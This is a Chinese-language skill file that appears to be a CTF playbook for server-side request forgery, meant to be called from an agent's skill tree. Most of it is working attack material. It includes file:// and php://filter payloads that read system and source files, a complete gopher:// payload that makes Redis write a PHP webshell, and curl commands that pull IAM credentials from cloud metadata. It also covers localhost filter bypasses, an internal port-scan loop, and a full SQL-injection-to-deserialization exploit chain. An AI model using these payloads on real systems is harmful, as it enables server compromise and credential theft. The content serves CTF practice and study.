---
name: ctf-web-ssrf
description: CTF SSRF 服务端请求伪造 攻击 playbook。识别/触发指纹：SSRF / server-side request forgery / 服务端请求伪造 / 回显URL内容 / 服务器替你请求URL / file:// / gopher:// / dict:// / 云元数据 169.254.169.254 / IMDS / CURLOPT_PROTOCOLS 协议白名单缺失 / curl 未限制协议 / 内网探测 / URL 输入点 / 缩略图生成 / 网页预览 / import-from-url / webhook 回调地址 / blog 字段抓取。碰到这些指纹时由二级 ctf-web 路由表调用本 leaf，专项解决"这个考点怎么打"。
---

# CTF SSRF 服务端请求伪造 解题 playbook

> **定位**：CTF skill 树三级 leaf（知识锚点）。由二级 `ctf-web` 路由表按识别特征调用；本文件只讲"这个考点怎么打"，不重复工作流。
> **CTF 原则**：拿 flag 即止、不写修复、不臆想、区分确认与推测。靶机常不出网 → 优先本地回显路径（file 读源码、error 注入、iframe/base64 回显），OOB 回连（DNS exfil / UNC / attacker.com）在 CTF 靶机常不可达，仅作概念了解。

## 识别特征（什么时候调我）
- 参数接受 URL 且响应里出现该 URL 抓回来的内容（图片、标题、摘要、iframe 嵌入）。
- 抓取/预览/缩略图/import/webhook/avatar-from-url 等功能点，后台用 `curl` / `file_get_contents` / `requests` 取远程资源。
- `?url=` `?img=` `?blog=` `?path=` `?target=` `?next=` 等参数，改值后页面内容跟着变。
- 报错信息暴露后端 HTTP 库：`cURL error`、`guzzle`、`urllib`、`java.net.URL`、`libcurl/7.x`。
- 题目源码（`.bak`/泄露/`robots.txt`）里 curl 调用**未设 `CURLOPT_PROTOCOLS`**，或 `file_get_contents($url)` 直接收用户输入。
- 云主机特征：AWS/Azure/GCP 元数据 IP `169.254.169.254`、阿里云 `100.100.100.200`。
- 内网探测需求：flag 在 `127.0.0.1:xxxx`、`http://localhost:xxx` 只对内开放的服务。

## 核心攻击手法

### 1. 协议白名单缺失 → file:// 直读源码
后端用 curl 且未限 `CURLOPT_PROTOCOLS` 时，`file://` 让"取远程 URL"退化成"读本地任意文件"。CTF 里这是最直接的拿 flag / 读源码姿势。

```
file:///etc/passwd                      # 探测 + 确认协议可用
file:///var/www/html/flag.php           # 直接读 flag 文件
file:///var/www/html/index.php          # 读源码找下一步链
file:///proc/self/environ               # 读环境变量（常含 FLAG=）
php://filter/read=convert.base64-encode/resource=/var/www/html/flag.php
```

> curl 也支持 `file://`，但 PHP 的 `file_get_contents` / `fopen` 还能吃 `php://` 伪协议；先 fingerprint 后端库再选协议。

### 2. gopher:// 打内网服务（无协议限制时）
gopher 能向任意 TCP 端口灌原始字节 → 伪造 Redis / FastCGI / MySQL / HTTP 请求。常用于 SSRF → Redis 未授权 → 写 webshell / 写 SSH key。

```
# 打 Redis（空格用 %20、换行 %0d%0a，URL 全编码两遍）
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$<len>%0d%0a<webshell-url-encoded>%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$13%0d%0a/var/www/html%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$9%0d%0ashell.php%0d%0a*1%0d%0a$4%0d%0asave%0d%0a

# dict:// 探端口 / 探服务（比 gopher 轻，回显即开）
dict://127.0.0.1:6379/info
dict://127.0.0.1:11211/stats
```

> 用 [Gopherus](https://github.com/tarunkant/Gopherus) 生成 Redis/FastCGI/MySQL 等的 gopher payload，不要手搓。

### 3. 云元数据（IMDS）拿凭据 / flag
云实例的元数据服务只对内可达，SSRF 是唯一入口。**注意 IMDSv2 需要 SSRF 能塞 Header（`X-aws-ec2-metadata-token`），多数 CTF SSRF 做不到；IMDSv1 直接 GET。**

```
# AWS IMDSv1（无 token，老题通用）
curl http://169.254.169.254/latest/meta-data/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>  # AKSK
curl http://169.254.169.254/latest/user-data                       # 启动脚本常藏 flag

# 阿里云 / GCP / Azure
curl http://100.100.100.200/latest/meta-data/
curl "http://metadata.google.internal/computeMetadata/v1/" -H "Metadata-Flavor: Google"
curl "http://169.254.169.254/metadata/instance?api-version=2021-02-01" -H "Metadata: true"
```

### 4. 内网探测 + 绕过（黑名单型）
当白名单限 `http(s)://` 但允许任意 host：扫内网端口 / 找隐藏服务。常见绕过：`http://127.0.0.1`、`http://localhost`、DNS rebinding、`http://[::1]`、`http://0`、`http://0x7f000001`、`http://127.1`、`http://2130706433`（十进制 IP）、302 跳转（自建服务器返回 `Location: file:///etc/passwd`）。

```
# 快速探测 127.0.0.1 开放端口（CTF 靶机别高并发，线程≤5）
for p in 22 80 6379 8080 11211 3306 9000; do
  curl -s -o /dev/null -w "$p:%{http_code}\n" "http://TARGET/?url=http://127.0.0.1:$p/"
done
```

## CTF 实战结晶

### [网鼎杯2018] Fakebook —— 协议白名单缺失的教科书链
**链路**：`robots.txt` 泄露 `user.php.bak` → 审计发现 `UserInfo::get()` 用 curl 无 `CURLOPT_PROTOCOLS` → `view.php?no=` SQLi（`anti_sqli()` 只拦 `union\Wselect`，用 `union/**/select` 绕）→ UNION 注入第 4 列塞恶意序列化对象 → `view.php` 反序列化触发 `getBlogContents()` → curl `file:///var/www/html/flag.php` → 响应 base64 进 iframe → 解码得 flag。

flag：`flag{cc6967ce-f4af-487f-9047-20711401ec7a}`（来源 `/var/www/html/flag.php`）

关键点：SSRF 的 URL 不是直接用户输入，而是**反序列化对象的 `blog` 属性**——注册时 `isValidBlog()` 校验了 `https://`，但 SQLi 直接改 `data` 列绕过校验，控制 `blog` 为 `file://`。`CURLOPT_PROTOCOLS` 没设 = file/gopher/dict 全开。

链上三件套确认可用：
- `file:///etc/passwd` → 919 字节，确认 file 协议可读。
- `file:///flag` → 空（文件不在根目录 / 权限）。
- `file:///var/www/html/flag.php` → 命中，base64 解码得 flag。

构造的恶意序列化 payload（blog 字段长度必须手算同步 `s:NN`）：
```
O:8:"UserInfo":3:{s:4:"name";s:1:"a";s:3:"age";i:1;s:4:"blog";s:27:"file:///var/www/html/flag.php";}
```
SQLi 投递（WAF 绕过 + 4 列对齐）：
```
view.php?no=0 union/**/select 1,2,3,'O:8:"UserInfo":3:{s:4:"name";s:1:"a";s:3:"age";i:1;s:4:"blog";s:27:"file:///var/www/html/flag.php";}'
```
解码 iframe 回显：
```
curl -s "http://TARGET/view.php?no=0 union/**/select 1,2,3,'<PAYLOAD>'" \
  | grep -oP 'base64,[A-Za-z0-9+/=]+' | cut -d, -f2 | base64 -d
```

**做题套路沉淀**：见 curl 抓 URL 类功能，先 grep 源码找 `CURLOPT_PROTOCOLS`；缺失就直接试 `file:///etc/passwd`。读源码定位真正的"URL 字段"（未必是显式参数，可能是反序列化对象属性 / DB 列 / 配置项）。

## 工具命令
```bash
# 探 SSRF 是否存在 + 支持哪些协议
curl -v "http://TARGET/?url=file:///etc/passwd"
curl -v "http://TARGET/?url=http://127.0.0.1:6379/"
# gopher payload 生成器
gopherus --exploit redis        # 交互式生成 Redis gopher payload
# 内网端口轻量探测（线程≤5，CTF 靶机别打挂）
ffuf -w ports.txt -t 3 -u "http://TARGET/?url=http://127.0.0.1:FUZZ/" -mc all
# base64 解 iframe / 响应里的编码回显
echo "<base64>" | base64 -d
```

## 深度参考（穷尽技巧时加载）
- hack-skills-main/skills/ssrf-server-side-request-forgery/SKILL.md

## 关联 leaf
- `ctf-web-sqli` —— Fakebook 链上游：UNION 注入把恶意序列化串写进 `data` 列。
- `ctf-web-deser` —— Fakebook 链中游：控制反序列化对象属性作为 SSRF 的 URL 载体。
- 完整链：`ctf-web-sqli` → `ctf-web-deser` → `ctf-web-ssrf`（Fakebook 三连）。
- `ctf-web-lfi` —— file:// 直读与 `php://filter` 读源码手法重叠。
